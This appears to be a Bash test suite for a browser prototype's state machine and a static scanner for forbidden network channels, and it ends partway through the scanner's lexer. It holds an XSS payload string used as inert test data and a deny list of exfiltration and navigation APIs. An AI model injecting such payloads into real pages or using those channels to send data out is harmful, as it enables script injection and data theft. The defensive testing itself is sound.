#!/usr/bin/env bash
# owner-journey.test.sh — sensors for the owner-journey prototype (issue #348)
#
# WHY
#   The prototype's entire value is that its closed-shape contract actually
#   holds: every legal transition works, every illegal one fails closed, a
#   tampered or oversized persisted value never becomes a workflow state, and
#   no network/DOM-injection channel exists anywhere in the three static
#   files. This suite tests the SAME `app.js` the browser loads (via Node's
#   `require()`, per the contract's own requirement that the browser script
#   expose its pure state model through CommonJS) rather than a
#   reimplementation of its logic, plus static scans of the markup and
#   stylesheet for the forbidden channels the issue enumerates.
#
#   A handful of checks below are mutation witnesses (AC10): they run the
#   exact same check function against a deliberately broken copy of the real
#   file and assert the check NOW fails. A check that still passes against a
#   mutant it's supposed to catch is a vacuous sensor — this proves each one
#   isn't.
#
# USAGE
#   scripts/tests/owner-journey.test.sh
set -uo pipefail

SCRIPT_DIR=$(CDPATH='' cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
REPO_ROOT=$(CDPATH='' cd "$SCRIPT_DIR/../.." && pwd)
PROTO_DIR="$REPO_ROOT/prototypes/owner-journey"
APP_JS="$PROTO_DIR/app.js"
INDEX_HTML="$PROTO_DIR/index.html"
STYLES_CSS="$PROTO_DIR/styles.css"
README_MD="$PROTO_DIR/README.md"

PASS=0
FAIL=0
ok()  { echo "  ok   — $1"; PASS=$((PASS + 1)); }
bad() { echo "  FAIL — $1"; FAIL=$((FAIL + 1)); }

for f in "$APP_JS" "$INDEX_HTML" "$STYLES_CSS" "$README_MD"; do
  [[ -f "$f" ]] || { echo "owner-journey.test.sh: missing required file: $f" >&2; exit 2; }
done

command -v node >/dev/null 2>&1 || { echo "owner-journey.test.sh: node is required" >&2; exit 2; }

TMP_DIR=$(mktemp -d "${TMPDIR:-/tmp}/owner-journey-test.XXXXXX")
trap 'rm -rf "$TMP_DIR"' EXIT

# =============================================================================
# Section 1 — pure state model, exercised through Node's require() of the
# real app.js (not a copy, not a reimplementation).
# =============================================================================
echo "pure state model (Node, via require of the real app.js)"

NODE_SCRIPT="$TMP_DIR/assertions.js"
cat > "$NODE_SCRIPT" <<'NODEEOF'
'use strict';
const APP = require(process.env.OJ_APP_PATH);

const lines = [];
function ok(desc) { lines.push('OK\t' + desc); }
function bad(desc, extra) { lines.push('FAIL\t' + desc + (extra !== undefined ? ' :: ' + JSON.stringify(extra) : '')); }
function check(desc, cond, extra) { cond ? ok(desc) : bad(desc, extra); }
function eq(a, b) { return JSON.stringify(a) === JSON.stringify(b); }
// A deep snapshot taken BEFORE calling transition(), so a reducer that
// mutates its input object in place and returns that same reference cannot
// make an eq(result, originalReference) comparison vacuously true (Codex
// round-2 finding: `eq(APP.transition(s, action, payload), s)` compares the
// result against the very reference that may have just been mutated, so an
// in-place mutation makes the check trivially "pass"). Comparing against a
// snapshot taken first is immune to that.
function snapshot(state) { return JSON.parse(JSON.stringify(state)); }

// ---- constants ----
check('RESULT_TEXT is the exact required sentence', APP.RESULT_TEXT === 'Demo complete. No code was changed or deployed.', APP.RESULT_TEXT);
check('exactly 3 allowlisted example projects', Array.isArray(APP.ALLOWLISTED_PROJECTS) && APP.ALLOWLISTED_PROJECTS.length === 3);
check('WORK_SUBSTAGES is the exact ordered set', eq(APP.WORK_SUBSTAGES, ['understanding', 'planning', 'building', 'checking', 'ready_for_review']));
check('STORAGE_MAX_BYTES is 256', APP.STORAGE_MAX_BYTES === 256);
check('REQUEST_MAX_BYTES is 4096', APP.REQUEST_MAX_BYTES === 4096);
check('FEEDBACK_MAX_BYTES is 2048', APP.FEEDBACK_MAX_BYTES === 2048);

// ---- utf8ByteLength: the contract's own worked cases ----
check('utf8ByteLength: ascii', APP.utf8ByteLength('abc') === 3);
check('utf8ByteLength: 2-byte codepoint (e-acute)', APP.utf8ByteLength('café') === 5);
check('utf8ByteLength: 4-byte codepoint (emoji)', APP.utf8ByteLength('😀') === 4);
check('utf8ByteLength differs from .length for multi-byte text (sanity on the boundary math itself)', 'é'.length !== APP.utf8ByteLength('é'));

// ---- exact UTF-8 boundaries: request (ASCII AND multi-byte, so a validator
// that switches to .length instead of utf8ByteLength cannot pass both) ----
check('request text at exactly 4096 ASCII bytes is valid', APP.isValidRequestText('a'.repeat(4096)) === true);
check('request text at 4097 ASCII bytes is invalid', APP.isValidRequestText('a'.repeat(4097)) === false);
// 1024 emoji = 4096 UTF-8 bytes (4 bytes each) but only 2048 UTF-16 code
// units — a validator using .length would wrongly accept 1025+ of them.
check('request text at exactly 1024 emoji (4096 UTF-8 bytes, 2048 .length) is valid', APP.isValidRequestText('\u{1F600}'.repeat(1024)) === true);
check('request text at 1025 emoji (4100 UTF-8 bytes) is invalid even though .length is only 2050', APP.isValidRequestText('\u{1F600}'.repeat(1025)) === false);
check('blank request text is invalid', APP.isValidRequestText('   ') === false);
check('non-string request text is invalid', APP.isValidRequestText(null) === false);

// ---- exact UTF-8 boundaries: feedback (same ASCII + multi-byte pairing) ----
check('feedback text at exactly 2048 ASCII bytes is valid', APP.isValidFeedbackText('b'.repeat(2048)) === true);
check('feedback text at 2049 ASCII bytes is invalid', APP.isValidFeedbackText('b'.repeat(2049)) === false);
// 512 emoji = 2048 UTF-8 bytes but only 1024 .length.
check('feedback text at exactly 512 emoji (2048 UTF-8 bytes, 1024 .length) is valid', APP.isValidFeedbackText('\u{1F600}'.repeat(512)) === true);
check('feedback text at 513 emoji (2052 UTF-8 bytes) is invalid even though .length is only 1026', APP.isValidFeedbackText('\u{1F600}'.repeat(513)) === false);
check('empty feedback text is invalid', APP.isValidFeedbackText('') === false);

// ---- storage write stays well under its own bound ----
check('serializePersisted output is <= 256 UTF-8 bytes', APP.utf8ByteLength(APP.serializePersisted('demo-storefront')) <= APP.STORAGE_MAX_BYTES);

// ---- full legal path across every state, in order ----
(function () {
  let s = APP.initialState();
  check('initial state is connect', s.screen === 'connect');
  s = APP.transition(s, 'select_project', 'demo-storefront');
  check('connect + select_project(allowlisted) -> readiness', s.screen === 'readiness' && s.projectId === 'demo-storefront');
  s = APP.transition(s, 'continue');
  check('readiness + continue -> request', s.screen === 'request');
  s = APP.transition(s, 'create_blueprint', 'Make the demo nicer.');
  check('request + create_blueprint(valid) -> blueprint', s.screen === 'blueprint' && s.requestText === 'Make the demo nicer.');
  s = APP.transition(s, 'start_demo');
  check('blueprint + start_demo -> work:understanding', s.screen === 'work:understanding');
  ['planning', 'building', 'checking', 'ready_for_review'].forEach(function (next) {
    s = APP.transition(s, 'advance_work');
    check('advance_work reaches work:' + next, s.screen === 'work:' + next);
  });
  s = APP.transition(s, 'open_preview');
  check('work:ready_for_review + open_preview -> preview', s.screen === 'preview');
  s = APP.transition(s, 'submit_feedback', 'Looks good.');
  check('preview + submit_feedback(valid) stays preview and records it', s.screen === 'preview' && eq(s.feedback, ['Looks good.']));
  s = APP.transition(s, 'continue');
  check('preview + continue -> decision', s.screen === 'decision');
  s = APP.transition(s, 'wait');
  check('decision + wait stays decision with a safe-wait notice', s.screen === 'decision' && typeof s.notice === 'string' && s.notice.length > 0);
  s = APP.transition(s, 'approve_demo');
  check('decision + approve_demo -> result', s.screen === 'result');
  s = APP.transition(s, 'reset');
  check('reset from result returns to a fresh connect state', s.screen === 'connect' && s.projectId === null && s.requestText === null && eq(s.feedback, []));
})();

// ---- every back transition ----
(function () {
  let s = APP.transition(APP.initialState(), 'select_project', 'demo-storefront');
  check('readiness + back -> connect', APP.transition(s, 'back').screen === 'connect');
  s = APP.transition(s, 'continue');
  check('request + back -> readiness', APP.transition(s, 'back').screen === 'readiness');
  s = APP.transition(s, 'create_blueprint', 'x');
  check('blueprint + back -> request', APP.transition(s, 'back').screen === 'request');
  s = APP.transition(s, 'start_demo');
  ['a', 'b', 'c', 'd'].forEach(function () { s = APP.transition(s, 'advance_work'); });
  s = APP.transition(s, 'open_preview');
  check('preview + back -> work:ready_for_review', APP.transition(s, 'back').screen === 'work:ready_for_review');
  s = APP.transition(s, 'continue');
  check('decision + back -> preview', APP.transition(s, 'back').screen === 'preview');
})();

// ---- exhaustive illegal-pair sweep: every screen x every action not in the
// legal table must leave state byte-for-byte unchanged ----
(function () {
  const ALL_SCREENS = ['connect', 'readiness', 'request', 'blueprint', 'work:understanding', 'work:planning', 'work:building', 'work:checking', 'work:ready_for_review', 'preview', 'decision', 'result'];
  const ALL_ACTIONS = ['select_project', 'continue', 'back', 'create_blueprint', 'start_demo', 'advance_work', 'open_preview', 'submit_feedback', 'approve_demo', 'wait', 'bogus_action', ''];
  const LEGAL = {
    'connect|select_project': 1,
    'readiness|continue': 1, 'readiness|back': 1,
    'request|create_blueprint': 1, 'request|back': 1,
    'blueprint|start_demo': 1, 'blueprint|back': 1,
    'work:understanding|advance_work': 1, 'work:planning|advance_work': 1, 'work:building|advance_work': 1, 'work:checking|advance_work': 1,
    'work:ready_for_review|open_preview': 1,
    'preview|submit_feedback': 1, 'preview|continue': 1, 'preview|back': 1,
    'decision|approve_demo': 1, 'decision|wait': 1, 'decision|back': 1
  };
  let checked = 0;
  let allUnchanged = true;
  const failures = [];
  ALL_SCREENS.forEach(function (screen) {
    ALL_ACTIONS.forEach(function (action) {
      const key = screen + '|' + action;
      if (LEGAL[key]) return;
      checked += 1;
      const before = { screen: screen, projectId: 'demo-storefront', requestText: 'x', feedback: ['y'], notice: null };
      const expected = snapshot(before); // taken BEFORE the call: see the `snapshot()` comment above
      const after = APP.transition(before, action, 'demo-storefront');
      if (!eq(expected, after)) {
        allUnchanged = false;
        failures.push(key + ' -> ' + JSON.stringify(after));
      }
    });
  });
  check('every illegal screen/action pair (' + checked + ' checked) leaves state unchanged', allUnchanged, failures.slice(0, 5));
})();

// ---- invalid payload on an otherwise-legal action must also fail closed.
// Each assertion compares the FULL state object, not just `.screen` — a
// mutant that keeps the same screen but corrupts projectId/requestText/
// feedback on an invalid payload must still be caught. Every call below
// gets its OWN freshly-built state object (never reused across checks) and
// the expected value is a `snapshot()` taken BEFORE transition() runs, so a
// reducer that mutated its input in place and returned that same reference
// cannot make the comparison vacuously true (Codex round-2 finding: the
// previous version reused one `s` reference as both the call's input and
// the comparison target, so an in-place `state.feedback.push(...)` mutation
// that then returned `state` unchanged would still read as "unchanged"). ----
(function () {
  function unchanged(state, action, payload) {
    const expected = snapshot(state);
    const after = APP.transition(state, action, payload);
    return eq(expected, after);
  }

  check('select_project with an unlisted id leaves the ENTIRE state unchanged', unchanged({ screen: 'connect', projectId: null, requestText: null, feedback: [], notice: null }, 'select_project', 'not-a-real-id'));
  check('create_blueprint with blank text leaves the entire state unchanged', unchanged({ screen: 'request', projectId: 'demo-storefront', requestText: null, feedback: [], notice: null }, 'create_blueprint', '   '));
  check('create_blueprint with 4097-byte text leaves the entire state unchanged', unchanged({ screen: 'request', projectId: 'demo-storefront', requestText: null, feedback: [], notice: null }, 'create_blueprint', 'a'.repeat(4097)));
  check('start_demo with no request text leaves the entire state unchanged (defense in depth)', unchanged({ screen: 'blueprint', projectId: 'demo-storefront', requestText: null, feedback: [], notice: null }, 'start_demo'));
  check('submit_feedback with blank text leaves the entire state unchanged (records nothing)', unchanged({ screen: 'preview', projectId: 'demo-storefront', requestText: 'x', feedback: [], notice: null }, 'submit_feedback', ''));
  check('submit_feedback with 2049-byte text leaves the entire state unchanged', unchanged({ screen: 'preview', projectId: 'demo-storefront', requestText: 'x', feedback: [], notice: null }, 'submit_feedback', 'z'.repeat(2049)));
})();

// ---- an adversarial reducer that mutates its input in place is itself
// caught by the above (proves the snapshot-based comparison, not just the
// real reducer, is exercised): a hand-written mutating stand-in that pushes
// onto the SAME feedback array and returns the SAME object reference must
// fail `unchanged()`, where the old `eq(result, s)` shape would have missed
// it entirely. ----
(function () {
  function mutatingRejectFeedback(state) {
    state.feedback.push('smuggled in place');
    return state; // same reference, "unchanged" by naive reference/JSON-of-self comparisons
  }
  function unchanged(transitionFn, state, action, payload) {
    const expected = snapshot(state);
    const after = transitionFn(state, action, payload);
    return eq(expected, after);
  }
  const fixture = { screen: 'preview', projectId: 'demo-storefront', requestText: 'x', feedback: [], notice: null };
  check('mutation witness (in-place mutation on rejection): the real transition() truly leaves feedback empty on a rejected submit', unchanged(APP.transition, { screen: 'preview', projectId: 'demo-storefront', requestText: 'x', feedback: [], notice: null }, 'submit_feedback', '') === true);
  check('mutation witness (in-place mutation on rejection): the snapshot-based check catches an in-place-mutating stand-in that the old reference-reusing check would have missed', unchanged(mutatingRejectFeedback, fixture, 'submit_feedback', '') === false);
})();

// ---- hostile HTML is only ever carried as inert data ----
(function () {
  const hostile = '<img src=x onerror=alert(1)>';
  check('a hostile-looking string is still valid request text (it is just bytes)', APP.isValidRequestText(hostile) === true);
  const s = APP.transition({ screen: 'request', projectId: 'demo-storefront', requestText: null, feedback: [], notice: null }, 'create_blueprint', hostile);
  check('hostile HTML is carried through verbatim as inert string data', s.requestText === hostile);
})();

// ---- hydration: only ever connect or request, never any other screen ----
(function () {
  check('hydrate(null) -> connect, no notice (an ordinary first visit)', (function () { const s = APP.hydrate(null); return s.screen === 'connect' && !s.notice; })());
  const good = APP.serializePersisted('demo-storefront');
  check('hydrate(valid persisted value) -> request, with that exact project bound', (function () { const s = APP.hydrate(good); return s.screen === 'request' && s.projectId === 'demo-storefront' && !s.notice; })());
  check('hydrate(malformed JSON) -> connect with an accessible notice', (function () { const s = APP.hydrate('{not json'); return s.screen === 'connect' && !!s.notice; })());
  check('hydrate(wrong schema/"unknown version") -> connect with a notice', (function () { const s = APP.hydrate(JSON.stringify({ schema: 'gibson.owner-journey-prototype.local.v2', projectId: 'demo-storefront' })); return s.screen === 'connect' && !!s.notice; })());
  check('hydrate(unknown repository id) -> connect with a notice', (function () { const s = APP.hydrate(JSON.stringify({ schema: APP.SCHEMA, projectId: 'not-a-real-project' })); return s.screen === 'connect' && !!s.notice; })());
  check('hydrate(unknown/extra key) -> connect with a notice', (function () { const s = APP.hydrate(JSON.stringify({ schema: APP.SCHEMA, projectId: 'demo-storefront', extra: 1 })); return s.screen === 'connect' && !!s.notice; })());
  check('hydrate(missing key) -> connect with a notice', (function () { const s = APP.hydrate(JSON.stringify({ schema: APP.SCHEMA })); return s.screen === 'connect' && !!s.notice; })());
  check('hydrate(array instead of object) -> connect with a notice', (function () { const s = APP.hydrate(JSON.stringify(['not', 'an', 'object'])); return s.screen === 'connect' && !!s.notice; })());
  // A whitespace-padded but otherwise perfectly SHAPE-VALID persisted
  // value: exact schema string, exact 2-key set, an allowlisted project id
  // — the only thing wrong with it is that the raw string is > 256 bytes.
  // This isolates the byte-cap check itself; a validator that dropped the
  // 256-byte check but kept every shape check would still wrongly accept
  // this (unlike the old "corrupt the schema" case, which was rejected for
  // the wrong reason and so proved nothing about the size cap).
  const oversizedButShapeValid = '{"schema":"' + APP.SCHEMA + '",' + ' '.repeat(220) + '"projectId":"demo-storefront"}';
  check('the padded oversized fixture is valid JSON with the exact 2-key shape (sanity on the fixture itself)', (function () { const parsed = JSON.parse(oversizedButShapeValid); return eq(Object.keys(parsed).sort(), ['projectId', 'schema']) && parsed.schema === APP.SCHEMA && parsed.projectId === 'demo-storefront'; })());
  check('the padded oversized fixture really is over 256 UTF-8 bytes (sanity on the fixture itself)', APP.utf8ByteLength(oversizedButShapeValid) > APP.STORAGE_MAX_BYTES);
  check('hydrate(oversized-but-otherwise-shape-valid raw value) -> connect with a notice', (function () { const s = APP.hydrate(oversizedButShapeValid); return s.screen === 'connect' && !!s.notice; })());
  check('hydrateUnavailable() -> connect with a notice (storage itself is broken)', (function () { const s = APP.hydrateUnavailable(); return s.screen === 'connect' && !!s.notice; })());
  // Never any screen other than connect/request from any hydration path.
  [null, good, '{not json', JSON.stringify({ schema: APP.SCHEMA }), JSON.stringify(['x'])].forEach(function (raw) {
    const s = APP.hydrate(raw);
    if (s.screen !== 'connect' && s.screen !== 'request') bad('hydrate() produced an out-of-contract screen: ' + s.screen);
  });
  ok('hydrate() never produces a screen other than connect or request, across every case above');
})();

// ---- allowlist / reset isolation ----
(function () {
  let s = APP.transition(APP.initialState(), 'select_project', 'demo-storefront');
  check('reset clears the bound projectId', APP.transition(s, 'reset').projectId === null);
  s = APP.transition(APP.initialState(), 'select_project', 'demo-support-portal');
  s = APP.transition(s, 'continue');
  s = APP.transition(s, 'create_blueprint', 'x');
  const reset = APP.transition(s, 'reset');
  check('reset from mid-journey clears screen, request text, and feedback together', reset.screen === 'connect' && reset.requestText === null && eq(reset.feedback, []));
})();

// ---- reset from EVERY reachable screen, not just a sample: a regression
// that only handles reset for some screens (e.g. forgets it inside the
// work:* substages, or from preview/decision/result) must be caught here,
// not just from the three screens the earlier check happened to use. ----
(function () {
  function buildJourneyTo(screen) {
    let s = APP.transition(APP.initialState(), 'select_project', 'demo-storefront');
    if (screen === 'connect') return APP.initialState();
    if (screen === 'readiness') return s;
    s = APP.transition(s, 'continue');
    if (screen === 'request') return s;
    s = APP.transition(s, 'create_blueprint', 'x');
    if (screen === 'blueprint') return s;
    s = APP.transition(s, 'start_demo');
    const order = ['understanding', 'planning', 'building', 'checking', 'ready_for_review'];
    const target = screen.indexOf('work:') === 0 ? screen.slice('work:'.length) : null;
    for (let i = 0; i < order.length; i += 1) {
      if (s.screen === 'work:' + order[i] && order[i] === target) return s;
      if (order[i] !== 'understanding') s = APP.transition(s, 'advance_work');
      if (s.screen === 'work:' + order[i] && order[i] === target) return s;
    }
    if (target) return s;
    s = APP.transition(s, 'open_preview');
    if (screen === 'preview') return s;
    s = APP.transition(s, 'continue');
    if (screen === 'decision') return s;
    s = APP.transition(s, 'approve_demo');
    return s; // 'result'
  }
  const EVERY_SCREEN = ['connect', 'readiness', 'request', 'blueprint', 'work:understanding', 'work:planning', 'work:building', 'work:checking', 'work:ready_for_review', 'preview', 'decision', 'result'];
  let allClean = true;
  const problems = [];
  EVERY_SCREEN.forEach(function (screen) {
    const before = buildJourneyTo(screen);
    if (before.screen !== screen) { allClean = false; problems.push('fixture builder reached ' + before.screen + ' instead of ' + screen); return; }
    const after = APP.transition(before, 'reset');
    const isCleanReset = eq(after, APP.initialState());
    if (!isCleanReset) { allClean = false; problems.push('reset from ' + screen + ' produced ' + JSON.stringify(after)); }
  });
  check('reset from every one of the 12 reachable screens produces an identical fresh connect state', allClean, problems.slice(0, 3));
})();

// =====================================================================
// Mutation witnesses A-C (AC10): each proves its check is not vacuous by
// running the SAME assertion shape against a deliberately broken stand-in
// and confirming detection, then re-confirming the REAL module is clean.
// =====================================================================

// Each witness below defines ONE predicate function and runs the IDENTICAL
// function against both the real module and a deliberately broken stand-in.
// The predicate must return true (safe) for the real module and false
// (caught) for the mutant — the same check, not two different assertions —
// which is what actually proves the check is capable of catching the
// mutation it claims to catch (Codex round-1 finding: the previous version
// asserted the mutant's bug existed and separately asserted the real module
// was clean, without ever applying one shared predicate to both).

// A — direct-result transition must not be reachable from any single action.
(function () {
  function mutantTransition(state, action, payload) {
    if (action === 'jump_to_result') return Object.assign({}, state, { screen: 'result' });
    return APP.transition(state, action, payload);
  }
  function noDirectResultJump(transitionFn) {
    // Two SEPARATE initialState() calls (not one shared reference passed
    // in and then compared against itself) — initialState() always returns
    // a fresh object, so `expected` cannot be the same reference `after`
    // even if transitionFn mutated its input in place and returned it.
    const expected = APP.initialState();
    const after = transitionFn(APP.initialState(), 'jump_to_result');
    return eq(expected, after);
  }
  check('predicate "no direct-result jump" passes against the real transition()', noDirectResultJump(APP.transition) === true);
  check('mutation witness (direct-result transition): the SAME predicate catches the mutant', noDirectResultJump(mutantTransition) === false);
})();

// B — hydration must only ever produce connect or request, never result.
(function () {
  function mutantHydrate(rawValue) {
    if (rawValue === 'FORCE_RESULT') return { screen: 'result', projectId: null, requestText: null, feedback: [], notice: null };
    return APP.hydrate(rawValue);
  }
  function hydrationNeverReachesResult(hydrateFn) {
    const out = hydrateFn('FORCE_RESULT');
    return out.screen !== 'result';
  }
  check('predicate "hydration never reaches result" passes against the real hydrate()', hydrationNeverReachesResult(APP.hydrate) === true);
  check('mutation witness (hydration-to-result): the SAME predicate catches the mutant', hydrationNeverReachesResult(mutantHydrate) === false);
})();

// C — free-form persistence (an extra key) must be rejected, not silently accepted.
(function () {
  function mutantIsValidPersisted(parsed) {
    if (!parsed || typeof parsed !== 'object') return false;
    if (parsed.schema !== APP.SCHEMA) return false;
    if (!APP.isValidProjectId(parsed.projectId)) return false;
    return true; // bug: forgot the exact-key-set check
  }
  const withFreeForm = { schema: APP.SCHEMA, projectId: 'demo-storefront', note: 'free-form text that must never persist' };
  function rejectsFreeForm(validatorFn) {
    return validatorFn(withFreeForm) === false;
  }
  check('predicate "rejects an extra key" passes against the real isValidPersisted()', rejectsFreeForm(APP.isValidPersisted) === true);
  check('mutation witness (free-form persistence): the SAME predicate catches the mutant', rejectsFreeForm(mutantIsValidPersisted) === false);
})();

process.stdout.write(lines.join('\n') + '\n');
NODEEOF

OJ_APP_PATH="$APP_JS" node "$NODE_SCRIPT" > "$TMP_DIR/node-out.txt" 2> "$TMP_DIR/node-err.txt"
NODE_RC=$?
if [[ $NODE_RC -ne 0 ]]; then
  bad "pure state model Node script exited $NODE_RC (see stderr below)"
  sed 's/^/    /' "$TMP_DIR/node-err.txt"
else
  while IFS=$'\t' read -r verdict desc; do
    [[ -z "$verdict" ]] && continue
    if [[ "$verdict" == "OK" ]]; then
      ok "$desc"
    else
      bad "$desc"
    fi
  done < "$TMP_DIR/node-out.txt"
fi

# =============================================================================
# Section 2 — static scan of index.html
# =============================================================================
echo
echo "static markup (index.html)"

count_matches() { grep -c -E "$1" "$2" 2>/dev/null || true; }

HEADINGS="Connect Readiness Request Blueprint Work Preview Decision Result"
HEADING_MISS=0
for h in $HEADINGS; do
  grep -qF "<h2>$h</h2>" "$INDEX_HTML" || HEADING_MISS=$((HEADING_MISS + 1))
done
check_count=$(grep -c '<h2>' "$INDEX_HTML")
if [[ "$HEADING_MISS" -eq 0 && "$check_count" -eq 8 ]]; then
  ok "exactly the 8 required state headings are present (Connect..Result)"
else
  bad "expected exactly 8 headings Connect..Result, found $check_count with $HEADING_MISS missing"
fi

ASK_LABELS=("What I'm asking" "What it does" "Why" "Risks/undo" "Recommendation" "Safe-wait behavior" "Destination" "Evidence status")
ASK_MISS=0
for label in "${ASK_LABELS[@]}"; do
  grep -qF "<dt>$label</dt>" "$INDEX_HTML" || ASK_MISS=$((ASK_MISS + 1))
done
[[ "$ASK_MISS" -eq 0 ]] && ok "all 8 Ask Contract fields are present with exact labels" || bad "$ASK_MISS Ask Contract field label(s) missing or misworded"

grep -qF 'no GitHub connection' "$INDEX_HTML" && ok "the product-boundary disclaimer is present in the markup" || bad "product-boundary disclaimer missing from index.html"

SIM_COUNT=$(grep -c 'simulation-label' "$INDEX_HTML")
[[ "$SIM_COUNT" -ge 4 ]] && ok "simulation labels present on readiness/work/preview/decision ($SIM_COUNT found)" || bad "expected at least 4 simulation labels, found $SIM_COUNT"

check_no_form()    { ! grep -qiE '<form[ >]' "$1"; }
check_no_iframe()  { ! grep -qiE '<iframe' "$1"; }
check_no_object()  { ! grep -qiE '<object|<embed' "$1"; }
check_no_media()   { ! grep -qiE '<video|<audio' "$1"; }
check_no_ext_href(){ ! grep -qiE 'href=["'"'"']?(https?:)?//' "$1"; }
check_no_mailto()  { ! grep -qiE 'mailto:|tel:' "$1"; }
check_no_remote()  { ! grep -qiE '(src|href)=["'"'"'](https?:)?//' "$1"; }

check_no_form "$INDEX_HTML" && ok "no <form> element in index.html" || bad "<form> found in index.html"
check_no_iframe "$INDEX_HTML" && ok "no <iframe> in index.html" || bad "<iframe> found in index.html"
check_no_object "$INDEX_HTML" && ok "no <object>/<embed> in index.html" || bad "<object>/<embed> found in index.html"
check_no_media "$INDEX_HTML" && ok "no <video>/<audio> in index.html" || bad "<video>/<audio> found in index.html"
check_no_ext_href "$INDEX_HTML" && ok "no external or protocol-relative anchor href in index.html" || bad "external/protocol-relative href found in index.html"
check_no_mailto "$INDEX_HTML" && ok "no mailto:/tel: link in index.html" || bad "mailto:/tel: link found in index.html"
check_no_remote "$INDEX_HTML" && ok "no remote/protocol-relative script or stylesheet src/href in index.html" || bad "remote/protocol-relative resource reference found in index.html"

# =============================================================================
# Section 3 — static scan of app.js: forbidden JS channels, innerHTML, exact
# result wording, and no unqualified Shipped/Verified/Live claim.
# =============================================================================
echo
echo "static scan (app.js): forbidden channels and wording"

# Forbidden-channel sensor: a purpose-built JavaScript tokenizer/lexer, not
# an ERE. Twelve review rounds showed that matching formatter whitespace,
# nested grouping, helper-call arguments, and ||/?? fallbacks with a flattened
# regex does not converge; the owner replaced that mechanism. The ERE is not
# retained as a decision path.
#
# The lexer emits identifier, punctuation/operator, and literal tokens and
# ignores whitespace and comments. Text inside strings, regex bodies, and
# template-literal raw portions is not executable. ${...} interpolations are
# tokenized, including nested templates and braces. Malformed or lexically
# indeterminate input fails closed (nonzero), never reports clean.
#
# Member-access classification (the receiver immediately left of . / ?. or a
# computed [...]):
#   - direct and arbitrarily parenthesized window/location/document are visible
#   - top-level || / ?? fallbacks are visible through grouping; any reachable
#     operand that is the relevant global makes the access forbidden
#   - call results are opaque: a global used only as an argument to
#     adapter(...) / snapshot(...) does not make the call's return value that
#     global. Do not descend through call-argument parentheses.
#   - && is not a fallback; (window && other)?.open has other as the receiver
#   - window.location (dot, optional, constant-computed, grouped) is the same
#     navigation object as the bare location global when it is the receiver of
#     .href / .assign / .replace. A read or === comparison of window.location
#     itself stays clean. foo.location is not the navigation global.
#   - a forbidden member used as an assignment target in an object/array
#     destructuring pattern (including grouping and default-value forms) is
#     forbidden; object-literal values, destructuring *from* window, and
#     arbitrary foo.location targets are not.
#   - array literals are not computed-member suffixes; optional computed
#     access (foo?.["bar"]) analyzes the receiver before ?..
#   - window and globalThis are global-object identities. A terminal window
#     or document member (dot, optional, constant-computed, grouped) keeps
#     that identity only when the receiver is already a global object, so
#     globalThis.window.open, globalThis.document.location, and window.window
#     are the same channels as the unqualified forms. foo.window.open,
#     foo["window"].open, and ({window:{open(){}}}).window.open are local
#     properties, not those channels. Exact identifier/property boundaries:
#     mainwindow and locationCache are not those members. Helper-call results
#     stay opaque: adapter(globalThis.window).open is not window.open.
#   - direct open and location on globalThis are the same channels as
#     window.open and global location (dot, computed, assign, href/assign/
#     replace). A read of globalThis.location stays clean. foo.globalThis.open
#     and foo.globalThis.location.assign stay local.
#   - parenthesizing a call or constructor target is semantically transparent.
#     (fetch)("x"), (window.fetch)("x"), (fetch)?.("x"), and
#     new (globalThis["Worker"])(...) keep the callee/constructor identity.
#     A helper-call result stays opaque: adapter(fetch)("local") is not fetch.
#   - a bare location identifier used as an assignment target, including
#     object/array destructuring (and default-value forms), is the same
#     navigation assignment as location = ...; a read such as {x: location}
#     or a renamed destructure {location: localLocation} is not.
# Identifier matches are exact ($ and alnum are identifier characters), so
# prefetchData, mainwindow, $new, Worker$Factory are not the forbidden names.
# window.location assignment is distinct from a read or === comparison.
# document.location and location.href/assign/replace are member access.
# Constant computed members (window["open"], window["fetch"](),
# navigator["sendBeacon"]) match the identifier/dot spelling with the same
# call/new constraints; a non-constant computed key on a relevant global
# fails closed. String-literal contents and object-literal keys are not
# computed members.
# Slash lexical goal uses delimiter frames, not a flat previous-token table:
# object-literal } is an expression (division can follow); block } starts a
# statement (regex can follow). Function/class declaration bodies are
# statement boundaries (regex may follow); function/class expression bodies
# are expressions (division may follow) — stored as delimiter/body form
# metadata, not a global function/class close rule. Switch/catch bodies stay
# blocks. Control-header ) of if/while/for/with starts a statement (regex can
# follow); call/group ) is an expression (division can follow). A line
# terminator after return makes a following { a block (ASI), not an object.
# Unknown delimiter roles fail closed.
# The whole file is tokenized and checked before the function returns clean
# (no grep -q / SIGPIPE).
check_forbidden_js() {
  OJ_FORBIDDEN_TARGET="$1" node --input-type=commonjs <<'NODE'
'use strict';
/**
 * Bounded JavaScript tokenizer + forbidden-channel detector for issue #348.
 * Not a full parser. Fail closed on malformed or lexically indeterminate input.
 */
const fs = require('fs');

function mapOf(keys) {
  const o = Object.create(null);
  for (let i = 0; i < keys.length; i++) o[keys[i]] = true;
  return o;
}

const FORBIDDEN_IDENTS = mapOf([
  'XMLHttpRequest', 'sendBeacon', 'WebSocket', 'EventSource',
  'ServiceWorker', 'serviceWorker', 'importScripts'
]);

const RELEVANT_GLOBALS = mapOf(['window', 'location', 'document', 'globalThis']);
const GLOBAL_OBJECTS = mapOf(['window', 'globalThis']);

const NOT_CALLEE = mapOf([
  'if', 'else', 'while', 'for', 'switch', 'catch', 'function',
  'return', 'void', 'typeof', 'delete', 'await', 'case', 'do',
  'try', 'finally', 'with', 'class', 'const', 'let', 'var',
  'new', 'throw', 'yield', 'in', 'instanceof', 'of',
  'extends', 'static', 'default', 'export', 'from',
  'break', 'continue', 'debugger'
]);

const ASSIGN_OPS = mapOf([
  '=', '+=', '-=', '*=', '/=', '%=', '**=',
  '&=', '|=', '^=', '<<=', '>>=', '>>>=',
  '&&=', '||=', '??='
]);

const LOCATION_PROPS = mapOf(['href', 'assign', 'replace']);

function isIdentStart(c) {
  return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || c === '_' || c === '$';
}
function isIdentPart(c) {
  return isIdentStart(c) || (c >= '0' && c <= '9');
}
function isDigit(c) { return c >= '0' && c <= '9'; }
function isHex(c) {
  return isDigit(c) || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
}
function isLineTerm(c) { return c === '\n' || c === '\r' || c === '\u2028' || c === '\u2029'; }

const CONTROL_HEADERS = mapOf(['if', 'while', 'for', 'with']);

const EXPR_KWS = mapOf([
  'return', 'throw', 'yield', 'void', 'typeof', 'delete', 'await', 'case',
  'new', 'of', 'in', 'instanceof'
]);

const STMT_BODY_KWS = mapOf([
